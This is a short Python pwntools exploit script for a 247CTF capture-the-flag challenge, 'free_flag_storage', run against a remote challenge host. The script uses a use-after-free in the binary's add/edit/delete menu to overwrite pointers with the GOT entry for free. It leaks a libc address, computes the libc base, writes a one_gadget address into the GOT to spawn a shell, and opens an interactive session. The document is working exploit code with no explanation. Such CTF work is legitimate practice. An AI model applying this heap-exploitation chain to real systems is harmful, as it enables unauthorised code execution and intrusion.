from pwn import *

elf = ELF("free_flag_storage")
libc = ELF("libc6-i386_2.27-3ubuntu1_amd64.so")
#r=elf.process(env={"LD_PRELOAD":libc.path})
r = remote("6c4ad14142bd5d19.247ctf.com", 50091)
banner = "-------------------------"
#input("attach gdb")


def view():
    r.recvuntil(banner)
    r.sendline("print")


def add(size, data, index, score):
    r.recvuntil(banner)
    r.sendline("add")
    r.recvline()
    r.recvuntil("length:")
    r.sendline(str(size))
    r.recvuntil("value:\n")
    r.sendline(data)
    r.recvuntil("challenge_id:")
    r.sendline(str(index))
    r.recvuntil("score:")
    r.sendline(str(score))


def edit(index, data, score):
    r.recvuntil(banner)
    r.sendline("edit")
    r.recvuntil("edit:\n")
    r.sendline(str(index))
    r.recvuntil("):\n")
    r.sendline(data)
    r.recvuntil("challenge_id:")
    r.sendline(str(index))
    r.recvuntil("score:")
    r.sendline(str(score))


def delete(index):
    r.recvuntil(banner)
    r.sendline("delete")
    r.recvuntil("delete:\n")
    r.sendline(str(index))


add(0x10, "A", 0, 1)
add(0x10, "B", 0, 1)
add(0x10, "C", 0, 1)
# pause()
delete(0)
# pause()
edit(0, p32(elf.got['free'])*16, 1)
view()
r.recvuntil("247CTF{")
r.recvline()
r.recvuntil("247CTF{")
leak = u32(r.recv(4))
print("leak --> ",hex(leak))
libc_base=leak-libc.sym['free']
print("libc_base --> ",hex(libc_base))
one_gadget=libc_base+0x3cbec
edit(1,p32(one_gadget)*2,1)

# pause()

r.interactive()
